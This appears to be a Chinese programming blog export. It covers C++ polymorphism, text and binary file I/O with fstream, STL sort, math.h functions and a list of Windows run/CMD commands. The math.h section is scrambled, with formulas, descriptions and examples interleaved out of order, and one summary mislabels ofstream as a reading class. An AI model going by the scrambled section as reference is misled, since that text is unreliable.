class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IntelMemory</span> :<span class="keyword">public</span> Memory</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">storage</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Intel的内存条开始存储了！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Lenovo厂商</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LenovoCPU</span> :<span class="keyword">public</span> CPU</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">calculate</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Lenovo的CPU开始计算了！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LenovoVideoCard</span> :<span class="keyword">public</span> VideoCard</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">display</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Lenovo的显卡开始显示了！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LenovoMemory</span> :<span class="keyword">public</span> Memory</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">storage</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Lenovo的内存条开始存储了！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//第一台电脑零件</span></span><br><span class="line">	CPU * intelCpu = <span class="keyword">new</span> IntelCPU;</span><br><span class="line">	VideoCard * intelCard = <span class="keyword">new</span> IntelVideoCard;</span><br><span class="line">	Memory * intelMem = <span class="keyword">new</span> IntelMemory;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;第一台电脑开始工作：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//创建第一台电脑</span></span><br><span class="line">	Computer * computer1 = <span class="keyword">new</span> <span class="built_in">Computer</span>(intelCpu, intelCard, intelMem);</span><br><span class="line">	computer1-&gt;<span class="built_in">work</span>();</span><br><span class="line">	<span class="keyword">delete</span> computer1;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;-----------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;第二台电脑开始工作：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//第二台电脑组装</span></span><br><span class="line">	Computer * computer2 = <span class="keyword">new</span> <span class="built_in">Computer</span>(<span class="keyword">new</span> LenovoCPU, <span class="keyword">new</span> LenovoVideoCard, <span class="keyword">new</span> LenovoMemory);;</span><br><span class="line">	computer2-&gt;<span class="built_in">work</span>();</span><br><span class="line">	<span class="keyword">delete</span> computer2;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;-----------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;第三台电脑开始工作：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//第三台电脑组装</span></span><br><span class="line">	Computer * computer3 = <span class="keyword">new</span> <span class="built_in">Computer</span>(<span class="keyword">new</span> LenovoCPU, <span class="keyword">new</span> IntelVideoCard, <span class="keyword">new</span> LenovoMemory);;</span><br><span class="line">	computer3-&gt;<span class="built_in">work</span>();</span><br><span class="line">	<span class="keyword">delete</span> computer3;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>













<h2 id="5-文件操作"><a href="#5-文件操作" class="headerlink" title="5 文件操作"></a>5 文件操作</h2><p>程序运行时产生的数据都属于临时数据，程序一旦运行结束都会被释放</p>
<p>通过<strong>文件可以将数据持久化</strong></p>
<p>C++中对文件操作需要包含头文件 &#x3D;&#x3D;&lt; fstream &gt;&#x3D;&#x3D;</p>
<p>文件类型分为两种：</p>
<ol>
<li><strong>文本文件</strong>     -  文件以文本的<strong>ASCII码</strong>形式存储在计算机中</li>
<li><strong>二进制文件</strong> -  文件以文本的<strong>二进制</strong>形式存储在计算机中，用户一般不能直接读懂它们</li>
</ol>
<p>操作文件的三大类:</p>
<ol>
<li>ofstream：写操作</li>
<li>ifstream： 读操作</li>
<li>fstream ： 读写操作</li>
</ol>
<h3 id="5-1文本文件"><a href="#5-1文本文件" class="headerlink" title="5.1文本文件"></a>5.1文本文件</h3><h4 id="5-1-1写文件"><a href="#5-1-1写文件" class="headerlink" title="5.1.1写文件"></a>5.1.1写文件</h4><p>   写文件步骤如下：</p>
<ol>
<li><p>包含头文件   </p>
<p>  #include &lt;fstream&gt;</p>
</li>
<li><p>创建流对象  </p>
<p>ofstream ofs;</p>
</li>
<li><p>打开文件</p>
<p>ofs.open(“文件路径”,打开方式);</p>
</li>
<li><p>写数据</p>
<p>ofs &lt;&lt; “写入的数据”;</p>
</li>
<li><p>关闭文件</p>
<p>ofs.close();</p>
<p>​</p>
</li>
</ol>
<p>文件打开方式：</p>
<table>
<thead>
<tr>
<th>打开方式</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>ios::in</td>
<td>为读文件而打开文件</td>
</tr>
<tr>
<td>ios::out</td>
<td>为写文件而打开文件</td>
</tr>
<tr>
<td>ios::ate</td>
<td>初始位置：文件尾</td>
</tr>
<tr>
<td>ios::app</td>
<td>追加方式写文件</td>
</tr>
<tr>
<td>ios::trunc</td>
<td>如果文件存在先删除，再创建</td>
</tr>
<tr>
<td>ios::binary</td>
<td>二进制方式</td>
</tr>
</tbody></table>
<p><strong>注意：</strong> 文件打开方式可以配合使用，利用|操作符</p>
<p><strong>例如：</strong>用二进制方式写文件 <code>ios::binary |  ios:: out</code></p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ofstream ofs;</span><br><span class="line">	ofs.<span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, ios::out);</span><br><span class="line"></span><br><span class="line">	ofs &lt;&lt; <span class="string">&quot;姓名：张三&quot;</span> &lt;&lt; endl;</span><br><span class="line">	ofs &lt;&lt; <span class="string">&quot;性别：男&quot;</span> &lt;&lt; endl;</span><br><span class="line">	ofs &lt;&lt; <span class="string">&quot;年龄：18&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	ofs.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结：</p>
<ul>
<li>文件操作必须包含头文件 fstream</li>
<li>读文件可以利用 ofstream  ，或者fstream类</li>
<li>打开文件时候需要指定操作文件的路径，以及打开方式</li>
<li>利用&lt;&lt;可以向文件中写数据</li>
<li>操作完毕，要关闭文件</li>
</ul>
<h4 id="5-1-2读文件"><a href="#5-1-2读文件" class="headerlink" title="5.1.2读文件"></a>5.1.2读文件</h4><p>读文件与写文件步骤相似，但是读取方式相对于比较多</p>
<p>读文件步骤如下：</p>
<ol>
<li><p>包含头文件   </p>
<p>  #include &lt;fstream&gt;</p>
</li>
<li><p>创建流对象  </p>
<p>ifstream ifs;</p>
</li>
<li><p>打开文件并判断文件是否打开成功</p>
<p>ifs.open(“文件路径”,打开方式);</p>
</li>
<li><p>读数据</p>
<p>四种方式读取</p>
</li>
<li><p>关闭文件</p>
<p>ifs.close();</p>
</li>
</ol>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ifstream ifs;</span><br><span class="line">	ifs.<span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, ios::in);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!ifs.<span class="built_in">is_open</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;文件打开失败&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//第一种方式</span></span><br><span class="line">	<span class="comment">//char buf[1024] = &#123; 0 &#125;;</span></span><br><span class="line">	<span class="comment">//while (ifs &gt;&gt; buf)</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	cout &lt;&lt; buf &lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//第二种</span></span><br><span class="line">	<span class="comment">//char buf[1024] = &#123; 0 &#125;;</span></span><br><span class="line">	<span class="comment">//while (ifs.getline(buf,sizeof(buf)))</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	cout &lt;&lt; buf &lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//第三种</span></span><br><span class="line">	<span class="comment">//string buf;</span></span><br><span class="line">	<span class="comment">//while (getline(ifs, buf))</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	cout &lt;&lt; buf &lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> c;</span><br><span class="line">	<span class="keyword">while</span> ((c = ifs.<span class="built_in">get</span>()) != EOF)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; c;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ifs.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结：</p>
<ul>
<li>读文件可以利用 ifstream  ，或者fstream类</li>
<li>利用is_open函数可以判断文件是否打开成功</li>
<li>close 关闭文件</li>
</ul>
<h3 id="5-2-二进制文件"><a href="#5-2-二进制文件" class="headerlink" title="5.2 二进制文件"></a>5.2 二进制文件</h3><p>以二进制的方式对文件进行读写操作</p>
<p>打开方式要指定为 &#x3D;&#x3D;ios::binary&#x3D;&#x3D;</p>
<h4 id="5-2-1-写文件"><a href="#5-2-1-写文件" class="headerlink" title="5.2.1 写文件"></a>5.2.1 写文件</h4><p>二进制方式写文件主要利用流对象调用成员函数write</p>
<p>函数原型 ：<code>ostream&amp; write(const char * buffer,int len);</code></p>
<p>参数解释：字符指针buffer指向内存中一段存储空间。len是读写的字节数</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span> m_Name[<span class="number">64</span>];</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二进制文件  写文件</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//1、包含头文件</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、创建输出流对象</span></span><br><span class="line">	<span class="function">ofstream <span class="title">ofs</span><span class="params">(<span class="string">&quot;person.txt&quot;</span>, ios::out | ios::binary)</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//3、打开文件</span></span><br><span class="line">	<span class="comment">//ofs.open(&quot;person.txt&quot;, ios::out | ios::binary);</span></span><br><span class="line"></span><br><span class="line">	Person p = &#123;<span class="string">&quot;张三&quot;</span>  , <span class="number">18</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//4、写文件</span></span><br><span class="line">	ofs.<span class="built_in">write</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;p, <span class="built_in">sizeof</span>(p));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//5、关闭文件</span></span><br><span class="line">	ofs.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结：</p>
<ul>
<li>文件输出流对象 可以通过write函数，以二进制方式写数据</li>
</ul>
<h4 id="5-2-2-读文件"><a href="#5-2-2-读文件" class="headerlink" title="5.2.2 读文件"></a>5.2.2 读文件</h4><p>二进制方式读文件主要利用流对象调用成员函数read</p>
<p>函数原型：<code>istream&amp; read(char *buffer,int len);</code></p>
<p>参数解释：字符指针buffer指向内存中一段存储空间。len是读写的字节数</p>
<p>示例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span> m_Name[<span class="number">64</span>];</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">ifstream <span class="title">ifs</span><span class="params">(<span class="string">&quot;person.txt&quot;</span>, ios::in | ios::binary)</span></span>;</span><br><span class="line">	<span class="keyword">if</span> (!ifs.<span class="built_in">is_open</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;文件打开失败&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Person p;</span><br><span class="line">	ifs.<span class="built_in">read</span>((<span class="type">char</span> *)&amp;p, <span class="built_in">sizeof</span>(p));</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; p.m_Name &lt;&lt; <span class="string">&quot; 年龄： &quot;</span> &lt;&lt; p.m_Age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>文件输入流对象 可以通过read函数，以二进制方式读数据</li>
</ul>
]]></content>
      <categories>
        <category>C++学习</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>c++的STL</title>
    <url>/2023/03/15/STL/</url>
    <content><![CDATA[<h1 id="c-的STL"><a href="#c-的STL" class="headerlink" title="c++的STL"></a>c++的STL</h1><h2 id="sort排序"><a href="#sort排序" class="headerlink" title="sort排序"></a>sort排序</h2><h3 id="用法一"><a href="#用法一" class="headerlink" title="用法一"></a>用<span id="more"></span>法一</h3><!-- more -->

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[] = &#123;<span class="number">15</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">6</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sort</span>(a,a+<span class="number">7</span>);</span><br></pre></td></tr></table></figure>

<h3 id="用法二-从大到小"><a href="#用法二-从大到小" class="headerlink" title="用法二 -从大到小"></a>用法二 -从大到小</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[] = &#123;<span class="number">15</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span> ,<span class="number">6</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">4</span>,<span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());</span><br></pre></td></tr></table></figure>
<!-- more -->
<h3 id="用法三-结构体"><a href="#用法三-结构体" class="headerlink" title="用法三-结构体"></a>用法三-结构体</h3><p>sort(数组名+n1，数组名+n2,排序规则结构名());</p>
<p>排序规则结构的定义方式</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> 结构名</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​     <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">( <span class="type">const</span> T &amp; a1,<span class="type">const</span> T &amp; a2)</span> <span class="type">const</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//若a1在a2前面，则返回true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//eles返回false</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>STL</tag>
      </tags>
  </entry>
  <entry>
    <title>math faction</title>
    <url>/2023/02/25/math%20faction/</url>
    <content><![CDATA[<p>头文件math.h</p>
<p>实数绝对值函数</p>
<h2 id="➢指数函数"><a href="#➢指数函数" class="headerlink" title="➢指数函数"></a>➢指数函数</h2><p>double fabs(double<span id="more"></span> x);</p>
<p>double exp(double x);</p>
<p>求实数x的绝对值|x|</p>
<p>求e的实数x次幂ex</p>
<p>例: fabs(3.5)的值为3.5</p>
<p>例: exp(1.0)的值约为2.71828</p>
<p>fabs(-3.5)的值为3.5</p>
<p>exp(2. 5)的值约为12.1825</p>
<h2 id="平方根函数"><a href="#平方根函数" class="headerlink" title="平方根函数"></a>平方根函数</h2><p>double sqrt(double x);</p>
<h2 id="➢对数函数"><a href="#➢对数函数" class="headerlink" title="➢对数函数"></a>➢对数函数</h2><p>double log(double x);</p>
<p>求实数x的平方根vx</p>
<p>求以e为底正实数x的对数Inx</p>
<p>例: sqrt(100.0)的值约为10.0</p>
<p>double log10(doublex);</p>
<p>sqrt(12.96)的值约为3.6</p>
<p>求以10为底正实数x的对数lgx</p>
<h2 id="➢幂函数"><a href="#➢幂函数" class="headerlink" title="➢幂函数"></a>➢幂函数</h2><p>例: log(2.718283)的值约为1.0</p>
<p>double pow(double x, doubley); .</p>
<p>log(45.7)的值约为3.822098</p>
<p>求实数x的实数y次幂x</p>
<p>log10(1000.0)的值约为3.0</p>
<p>例: pow(2.0, 10.0)的值约为1024.0</p>
<p>log10(6.022e23)的值约为23.7797</p>
<p>pow(4.3, 2.9)的值约为68.7161</p>
<p>注: C只提供以e和10为底数的对数函数。当计算</p>
<p>以其它实数为底数的对数时，可利用换底公式。</p>
<h2 id="➢双曲函数"><a href="#➢双曲函数" class="headerlink" title="➢双曲函数"></a>➢双曲函数</h2><p>ex-e-x<br>shx或sinhx<br>double sinh(double x);<br>sinh x&#x3D;<br>2<br>chx或cosh xdouble cosh(double x);<br>thx或tanhx<br>double tanh(double x);<br>e*+ e-x<br>例: sinh(1.0)的值约为1.175201<br>coshx&#x3D; -<br>2<br>cosh(1.0)的值约为1.543081<br>tanh(1.0)的值约为0.7615942<br>ex- e-x</p>
<h2 id="➢取整函数"><a href="#➢取整函数" class="headerlink" title="➢取整函数"></a>➢取整函数</h2><p>tanh x &#x3D;ex+ e-x<br>[x1 double ceil(double x);<br>. lx」<br>double floor(double x);<br>例: ceil(1.1)的值约为2.0, ceil(-1.1)的值约为-1.0<br>floor(1.1)的值约为1.0, floor(-1.1)的值约为-2.0<br>ceil(1.0)和floor(1.0)的值都约为1.0, ceil(-1.0)和floor(-1.0)的值都约为-1.0</p>
<h2 id="➢取模函数"><a href="#➢取模函数" class="headerlink" title="➢取模函数"></a>➢取模函数</h2><p>xmody<br>double fmod(double x, double y);<br>例: fmod(14.0, 3.0)的值约为2.0, fmod(-14.0, -3.0)的值约为-2.0<br>fmod(-6.5, -3.2)的值约为-0.1, fmod(6.5, -3.2)的值约为0.1</p>
]]></content>
      <tags>
        <tag>math faction</tag>
      </tags>
  </entry>
  <entry>
    <title>CMD</title>
    <url>/2023/03/01/cmd/</url>
    <content><![CDATA[<p>链接：<a href="https://link.zhihu.com/?target=https://www.cnblogs.com/walkwaters/p/12153364.html">CMD命令大全</a><br>CMD命令：开始－<span id="more"></span>&gt;运行－&gt;键入cmd或command（在命令行里可以看到系统版本、文件系统版本）<br>chcp 修改默认字符集<br>chcp 936默认中文<br>chcp 65001</p>
<ol>
<li>appwiz.cpl：程序和功能</li>
<li>calc：启动计算器</li>
<li>chkdsk.exe：Chkdsk磁盘检查（管理员身份运行命令提示符）</li>
<li>cleanmgr: 打开磁盘清理工具</li>
<li>cmd.exe：CMD命令提示符</li>
<li>自动关机命令<br>　 Shutdown -s -t 600：表示600秒后自动关机<br>　 <a href="https://www.zhihu.com/search?q=shutdown%20-a&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22209115733%22%7D">shutdown -a</a> ：可取消定时关机<br>　 Shutdown -r -t 600：表示600秒后自动重启</li>
<li>CompMgmtLauncher：计算机管理</li>
<li>compmgmt.msc：计算机管理</li>
<li>credwiz：备份或还原储存的用户名和密码</li>
<li>control：控制面版</li>
<li>dcomcnfg：打开系统组件服务</li>
<li>devmgmt.msc：设备管理器</li>
<li>desk.cpl：屏幕分辨率</li>
<li>dfrgui：优化驱动器   Windows 7→dfrg.msc：磁盘碎片整理程序</li>
<li>dialer：电话拨号程序</li>
<li>diskmgmt.msc：磁盘管理</li>
<li>dvdplay：DVD播放器</li>
<li>dxdiag：检查DirectX信息</li>
<li>eudcedit：造字程序</li>
<li>eventvwr：事件查看器</li>
<li>explorer：打开资源管理器</li>
<li>Firewall.cpl：Windows防火墙</li>
<li>fsmgmt.msc：共享文件夹管理器</li>
<li><!-- more --></li>
<li>gpedit.msc：组策略</li>
<li>hdwwiz.cpl：设备管理器</li>
<li><a href="https://www.zhihu.com/search?q=inetcpl.cpl&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22209115733%22%7D">inetcpl.cpl</a>：Internet属性</li>
<li>intl.cpl：区域</li>
<li>iexpress：木马捆绑工具，系统自带</li>
<li>joy.cpl：游戏控制器</li>
<li>logoff：注销命令</li>
<li>lusrmgr.msc：本地用户和组</li>
<li>lpksetup：语言包安装&#x2F;删除向导，安装向导会提示下载语言包</li>
<li>lusrmgr.msc：本机用户和组</li>
<li>main.cpl：鼠标属性</li>
<li>mmsys.cpl：声音</li>
<li>mem.exe：显示内存使用情况（如果直接运行无效，可以先管理员身份运行命令提示符，在命令提示符里输入mem.exe&gt;d:a.txt 即可打开d盘查看a.txt，里面的就是内存使用情况了。当然什么盘什么文件名可自己决定。）</li>
<li>mmc：打开控制台</li>
<li>mobsync：同步命令</li>
<li>Msconfig.exe：系统配置实用程序</li>
<li>msdt：微软支持诊断工具</li>
<li>msinfo32：系统信息</li>
<li>mspaint：画图</li>
<li>Msra：Windows远程协助</li>
<li>mstsc：远程桌面连接</li>
<li>NAPCLCFG.MSC：客户端配置</li>
<li>ncpa.cpl：网络连接</li>
<li>narrator：屏幕“讲述人”</li>
<li>Netplwiz：高级用户帐户控制面板，设置登陆安全相关的选项</li>
<li>netstat : an(TC)命令检查接口</li>
<li>notepad：打开记事本</li>
<li>Nslookup：IP地址侦测器</li>
<li>odbcad32：ODBC数据源管理器</li>
<li>OptionalFeatures：打开“打开或关闭Windows功能”对话框</li>
<li>osk：打开屏幕键盘</li>
<li>perfmon.msc：计算机性能监测器</li>
<li>perfmon：计算机性能监测器</li>
<li>PowerShell：提供强大远程处理能力</li>
<li>printmanagement.msc：打印管理</li>
<li>powercfg.cpl：电源选项</li>
<li>psr：问题步骤记录器</li>
<li>Rasphone：网络连接</li>
<li>Recdisc：创建系统修复光盘</li>
<li>Resmon：资源监视器</li>
<li>Rstrui：系统还原</li>
<li>regedit.exe：注册表</li>
<li>regedt32：注册表编辑器</li>
<li>rsop.msc：组策略结果集</li>
<li>sdclt：备份状态与配置，就是查看系统是否已备份</li>
<li>secpol.msc：本地安全策略</li>
<li>services.msc：本地服务设置</li>
<li>sfc &#x2F;scannow：扫描错误并复原&#x2F;windows文件保护</li>
<li>sfc.exe：系统文件检查器</li>
<li>shrpubw：创建共享文件夹</li>
<li>sigverif：文件签名验证程序</li>
<li>slui：Windows激活，查看系统激活信息</li>
<li>slmgr.vbs -dlv ：显示详细的许可证信息<br>　 slmgr.vbs -dli ：显示许可证信息<br>　 <a href="https://www.zhihu.com/search?q=slmgr.vbs%20-xpr&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22209115733%22%7D">slmgr.vbs -xpr</a> ：当前许可证截止日期<br>　 slmgr.vbs -dti ：显示安装ID 以进行脱机激<br>　 <a href="https://www.zhihu.com/search?q=slmgr.vbs%20-ipk&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22209115733%22%7D">slmgr.vbs -ipk</a> ：(Product Key)安装产品密钥<br>　 slmgr.vbs -ato ：激活Windows<br>　 <a href="https://www.zhihu.com/search?q=slmgr.vbs%20-cpky&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22209115733%22%7D">slmgr.vbs -cpky</a> ：从注册表中清除产品密钥（防止泄露引起的攻击）<br>　 slmgr.vbs -ilc ：(License file)安装许可证<br>　 <a href="https://www.zhihu.com/search?q=slmgr.vbs%20-upk&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22209115733%22%7D">slmgr.vbs -upk</a> ：卸载产品密钥<br>　 slmgr.vbs -skms ：(name[ort] )批量授权</li>
<li>snippingtool：截图工具，支持无规则截图</li>
<li><a href="https://www.zhihu.com/search?q=soundrecorder&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:%22209115733%22%7D">soundrecorder</a>：录音机，没有录音时间的限制</li>
<li>StikyNot：便笺</li>
<li>sysdm.cpl：系统属性</li>
<li>sysedit：系统配置编辑器</li>
<li>syskey：系统加密，一旦加密就不能解开，保护系统的双重密码</li>
<li>taskmgr：任务管理器（旧版）</li>
<li>TM任务管理器（新版）</li>
<li>taskschd.msc：任务计划程序</li>
<li>timedate.cpl：日期和时间</li>
<li>UserAccountControlSettings用户账户控制设置</li>
<li>utilman：辅助工具管理器</li>
